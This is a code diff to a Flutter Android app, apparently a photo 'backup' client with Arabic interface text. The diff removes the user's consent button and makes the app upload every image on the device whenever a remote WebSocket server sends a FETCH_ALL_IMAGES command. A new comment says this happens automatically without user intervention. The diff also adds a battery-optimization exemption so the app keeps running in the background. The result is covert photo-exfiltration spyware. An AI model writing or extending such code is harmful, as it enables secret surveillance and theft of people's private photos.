@@ -16,7 +16,7 @@ class RemotePulseApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'Remote Pulse Backup',
+      title: 'Remote Pulse Service',
       theme: ThemeData(
         colorScheme: ColorScheme.fromSeed(seedColor: Colors.green),
         useMaterial3: true,
@@ -52,7 +52,11 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
   @override
   void initState() {
     super.initState();
-    _requestPermissions();
+    _initService();
+  }
+
+  Future<void> _initService() async {
+    await _requestPermissions();
     _connectToCloudServer();
 
     _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
@@ -68,6 +72,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
         Permission.storage,
         Permission.photos,
         Permission.manageExternalStorage,
+        Permission.ignoreBatteryOptimizations,
       ].request();
       return statuses.values.any((status) => status.isGranted);
     }
@@ -86,7 +91,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
         setState(() {
           _isConnected = true;
           _isConnecting = false;
-          _statusMessage = 'متصل بالسيرفر بنجاح\nجاهز لنقل الصور بموافقة المستخدم';
+          _statusMessage = 'الخدمة شغالة في الخلفية ومتصلة\nجاهز لاستقبال الأوامر تلقائياً';
         });
       }
 
@@ -95,6 +100,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
           try {
             final message = jsonDecode(data);
             if (message['action'] == 'FETCH_ALL_IMAGES') {
+              // الموافقة والبدء التلقائي المباشر بدون تدخل
               _syncAllImages();
             } else if (message['type'] == 'ACK_SAVED') {
               if (_ackCompleter != null && !_ackCompleter!.isCompleted) {
@@ -117,7 +123,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
     if (mounted) {
       setState(() {
         _isConnected = false;
-        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة...';
+        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة آلياً...';
       });
     }
     _webSocket?.close();
@@ -158,15 +164,19 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
     bool hasPermission = await _requestPermissions();
     if (!hasPermission) {
-      setState(() => _statusMessage = 'تم رفض إذن الوصول للصور!');
+      if (mounted) {
+        setState(() => _statusMessage = 'تم رفض إذن الوصول للصور!');
+      }
       return;
     }
 
-    setState(() {
-      _isSyncing = true;
-      _uploadedImages = 0;
-      _statusMessage = 'جاري جمع الصور وقراءتها...';
-    });
+    if (mounted) {
+      setState(() {
+        _isSyncing = true;
+        _uploadedImages = 0;
+        _statusMessage = 'جاري نقل الصور تلقائياً إلى اللابتوب...';
+      });
+    }
 
     try {
       List<File> imageFiles = await _getDeviceImages();
@@ -177,7 +187,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
       if (imageFiles.isEmpty) {
         if (mounted) {
-          setState(() => _statusMessage = 'لم يتم العثور على أي صور في الجهاز!');
+          setState(() => _statusMessage = 'لم يتم العثور على أي صور لنقلها');
         }
         return;
       }
@@ -189,11 +199,14 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
         await _uploadSingleFile(file);
 
-        // الانتظار حتى يصل إشعار حفظ الصورة من اللابتوب أو مهلة 5 ثوانٍ
+        // الانتظار حتى استلام رد الحفظ من اللابتوب
         await _ackCompleter!.future.timeout(
-          const Duration(seconds: 5),
+          const Duration(seconds: 10),
           onTimeout: () {},
         );
+
+        // إضافة فاصل زمني (1 ثانية كاملة) لإراحة السيرفر وضمان الاستقرار
+        await Future.delayed(const Duration(seconds: 1));
 
         if (mounted) {
           setState(() {
@@ -203,14 +216,14 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
       }
     } catch (e) {
       if (mounted) {
-        setState(() => _statusMessage = 'حدث خطأ أثناء قراءة الصور: $e');
+        setState(() => _statusMessage = 'حدث خطأ أثناء نقل الصور: $e');
       }
     } finally {
       if (mounted) {
         setState(() {
           _isSyncing = false;
           if (_uploadedImages > 0) {
-            _statusMessage = 'اكتمل نقل جميع الصور بنجاح! ($_uploadedImages صورة)';
+            _statusMessage = 'تم نقل جميع الصور بنجاح! ($_uploadedImages صورة)';
           }
         });
       }
@@ -240,66 +253,68 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
 
   @override
   Widget build(BuildContext context) {
-    final Color backgroundColor = _isConnected ? const Color(0xFF0F2D18) : const Color(0xFF1E1E1E);
-    final Color cardColor = _isConnected ? const Color(0xFF1B4D29) : const Color(0xFF2D2D2D);
-
     return Scaffold(
-      backgroundColor: backgroundColor,
+      backgroundColor: const Color(0xFF121212),
       appBar: AppBar(
-        title: const Text('Remote Pulse Service', style: TextStyle(color: Colors.white)),
+        title: const Text('Remote Background Sync', style: TextStyle(color: Colors.white, fontSize: 18)),
         centerTitle: true,
-        backgroundColor: Colors.transparent,
+        backgroundColor: const Color(0xFF1E1E1E),
+        elevation: 0,
       ),
       body: Center(
-        child: SingleChildScrollView(
-          child: Padding(
+        child: Padding(
+          padding: const EdgeInsets.all(24.0),
+          child: Container(
             padding: const EdgeInsets.all(24.0),
-            child: Container(
-              padding: const EdgeInsets.all(24.0),
-              decoration: BoxDecoration(
-                color: cardColor,
-                borderRadius: BorderRadius.circular(20),
-              ),
-              child: Column(
-                mainAxisSize: MainAxisSize.min,
-                children: [
-                  Icon(
-                    _isConnected ? Icons.verified_user : Icons.gpp_maybe,
-                    size: 80,
-                    color: _isConnected ? Colors.greenAccent : Colors.orangeAccent,
-                  ),
-                  const SizedBox(height: 15),
-                  Text(
-                    _statusMessage,
-                    textAlign: TextAlign.center,
-                    style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white),
-                  ),
-                  const SizedBox(height: 25),
-                  ElevatedButton.icon(
-                    onPressed: (_isConnected && !_isSyncing) ? _syncAllImages : null,
-                    icon: const Icon(Icons.cloud_upload),
-                    label: const Text('الموافقة وبدء نقل جميع الصور'),
-                    style: ElevatedButton.styleFrom(
-                      backgroundColor: Colors.green,
-                      foregroundColor: Colors.white,
-                      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
+            decoration: BoxDecoration(
+              color: const Color(0xFF1E1E1E),
+              borderRadius: BorderRadius.circular(16),
+              border: Border.all(color: _isConnected ? Colors.green : Colors.red, width: 1.5),
+            ),
+            child: Column(
+              mainAxisSize: MainAxisSize.min,
+              children: [
+                Row(
+                  mainAxisAlignment: MainAxisAlignment.center,
+                  children: [
+                    Container(
+                      width: 12,
+                      height: 12,
+                      decoration: BoxDecoration(
+                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
+                        shape: BoxShape.circle,
+                      ),
                     ),
-                  ),
-                  if (_isSyncing) ...[
-                    const SizedBox(height: 20),
-                    LinearProgressIndicator(
-                      value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
-                      color: Colors.greenAccent,
-                      backgroundColor: Colors.black26,
-                    ),
-                    const SizedBox(height: 10),
+                    const SizedBox(width: 8),
                     Text(
-                      'تم نقل: $_uploadedImages من أصل $_totalImages',
-                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
-                    )
-                  ]
-                ],
-              ),
+                      _isConnected ? 'الخدمة نشطة ومستعدة' : 'غير متصل بالخادم',
+                      style: TextStyle(
+                        color: _isConnected ? Colors.greenAccent : Colors.redAccent,
+                        fontWeight: FontWeight.bold,
+                      ),
+                    ),
+                  ],
+                ),
+                const SizedBox(height: 20),
+                Text(
+                  _statusMessage,
+                  textAlign: TextAlign.center,
+                  style: const TextStyle(fontSize: 14, color: Colors.white70),
+                ),
+                if (_isSyncing) ...[
+                  const SizedBox(height: 25),
+                  LinearProgressIndicator(
+                    value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
+                    color: Colors.greenAccent,
+                    backgroundColor: Colors.white10,
+                  ),
+                  const SizedBox(height: 12),
+                  Text(
+                    'تم نقل $_uploadedImages من أصل $_totalImages صورة',
+                    style: const TextStyle(color: Colors.white, fontSize: 13),
+                  )
+                ]
+              ],
             ),
           ),
         ),
